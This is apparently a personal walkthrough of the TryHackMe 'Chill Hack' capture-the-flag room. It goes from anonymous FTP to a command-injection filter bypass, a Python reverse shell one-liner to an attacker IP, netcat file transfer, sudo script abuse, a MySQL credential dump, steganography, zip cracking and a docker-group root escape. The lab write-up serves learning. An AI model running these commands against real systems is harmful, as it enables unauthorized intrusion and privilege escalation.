# Try_Hack_Me Chill Hack room

### Initial port scan
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/Screenshot_2022-02-21_13-35-27.png)
------------
### Looking at FTP
- FTP is open, so looks quickly have a look before i begin diving into the webserver on port 80
- `ftP <ip>`   When proompted the credentials are: anonymous:anonymous
- So theres one file there called "note.txt". To download locally we use `mget note.txt`
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/note.png)
- So not sure where this comes into play yet, but looks like were going to need to bypass some filtering
--------
### Moving onto webserver on port 80
- Before/while i start bruteforcing directories, ill visit the webpage to see what im working with.
- While Bruteforcing directories i found '/secret' webpage..so this looks interesting.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/secret.png)
- On the 'secret' webpage had a user input field which looks like its processing commands.
- `ls`, `which` would not work (It displayed "are you a hacker?") so thats one thing that was being filtered, but `id` did work.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/id.png)
--------
### Trying to get a reverse shell
- A lot of what i tried was filtered: python, nc, perl, bash...
- So i searched online to find command injection bypasses. I came across this really great github page for bypassing command injection filters. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- I then tried `l's'` to see if i can bypass the filter.


- WOOOO SUCCESS!, was able to execute it.
- I tried the bypass with the "which" command to see what binaries i can use to get a reverse shell but wierdly it wouldnt work? not sure why, luckily i found a workaround using echo and command expansion.
- `echo $(ls /usr/bin | grep python)` I tried to see if python was available first, and theres "python3" available
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/python.png)
--------
- Alright lets try a python reverse shell now. You can easily search python reverse shells online, ill be using one from https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell (MAKE SURE TO ADD IN THE QUOTES! p'y'thon to bypass the filter)
- `p'y'thon3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.100.95",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- WOOO!, we have a shell on the machine. But we dont have a stable shell, so lets stablize it.
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`, after typing in this command we can see the users name is displayed now.
- Now press "Ctrl+Z"--this will background your shell
- Now type "stty raw -echo"
- your screen will look like its frozen at this point, just type "fg" and hit enter

-------------
- Once i get a shell, first thing i usually do is check kernal versions, sudo privileges of user, and insecure binary files/shell scripts.
- Looking at sudo priliges `sudo -l`,  www-data is allowed to run a script as apaar.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/sudo-l.png)

- Looking at the bash script, it asks for two user inputs, $person and $msg
- The first variable $person just displays it in a string, but the 2nd variable $msg gets executed in bash. Since the script gets executed as apaar we can try to maintain privileges.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/sudo-l.png)
--------
- To execute the script as another user using sudo:  `sudo -u apaar /home/apaar/.helpline.sh` (Note! you need to use the path specified in "sudo -l" which is /home/apaar/.helpline.sh)
- When it prompts me for the 2nd variable, i use `/bin/bash`. This command will get executed in the script which will give me a bash shell as the user apaar
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/apaar.png)

- Ill stabalize the shell again just like we did before with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- Theres one file in apaar's home directory, and it is the user flag!
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/userflag.png)
---------
### Trying to find Root flag now
- I tried to see what i can run with apaar `sudo -l`....but doesnt look like anything, its the same script
- I also tried seeing if there were other scripts "aurick" owned that apaar might be able to run `find / -user aurick -iname *.sh 2>/dev/null`
- Bash histroy was also empty, and also checked binaries to see if any were exploitable..so far no luck.
- Decdied to look at the webserver files

- Inside the /var/www theres a directory called "files" that had a few php files. Looking at each file one by one, theres one that had the database creds that was not properly secured. 
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/database.png)
----------
- Accessing mysql database locally `mysql -u root -p`. After if will prompt you for a password "!@m+her00+@db"
- Now to enumerate the database manually
- `show databases;` -had a webportal database which looked interesting. `use webportal`
- `show tables;` -had only one table 'users'
- `SELECT * FROM users;` -dumped all the data
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/creds.png)

- I tried to switch users and nothing.....AHHHHHHHfgsgsf, it was a rabbit hole.
- Alright back to searching in the webserver folder again. 

---------
- After digger deeper in the webserver again, inside the hacker.php file in the directory "/var/www/files" there was a message "look in the dark! you will find your answer" with an image associated. Had a feeling something was embedded in the image, from past boxes on THM i know they love to hide stuff inside images.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/sneaky.png)
- Downloaded the file which is inisde "/var/www/files/images/hacker-with-laptop_23-2147985341.jpg"
- Start a listener `nc -lnvp > image.png` now send the file over on victim   `nc 10.9.100.95 5000 < hacker-with-laptop_23-2147985341.jpg`
- use steghide to attempt to extract the data `steghide extract -sf image.png`
- Alright great!, it created a "backup.zip" file, when we try to unzip it keeps asking for a password, so we can crack this with john
--------
- Cracking the zip file, John was giving me issues with the formating so i had to force the format. When you run john on the hashed file john will attempt to identify it. Then you can force the format after that.
- `john --format=pkzip  backupzip_hash -wordlist:/usr/share/wordlists/rockyou.txt`
- As we can see from the screenshot the password is "pass1word" 
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/zipcrack.png)!d0ntKn0wmYp@ssw0rd
- After unziping and entering in the password it created a source_code.php file. 
- Cating the file i immediately saw a password that was in base64, with a string below it that says "welcome anurodh" so this has to be his password
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/pass.png)
- Decoding it i got "!d0ntKn0wmYp@ssw0rd"
---------
- Back on my victim machine i tried to switch users `su anurodh` with using the same password. And it WORKED!
- Alright enumerating this user now. I tried sudo -l but nothing i could use. I looked at the group the user belonged to, and he was part of a docker group. From prior boxes i know theres a priv esc for this. I want to the GTFObins website and tried using a shell escape.
- `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- FInally! GOT ROOT.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/THM_chill_hack/images/root.png)


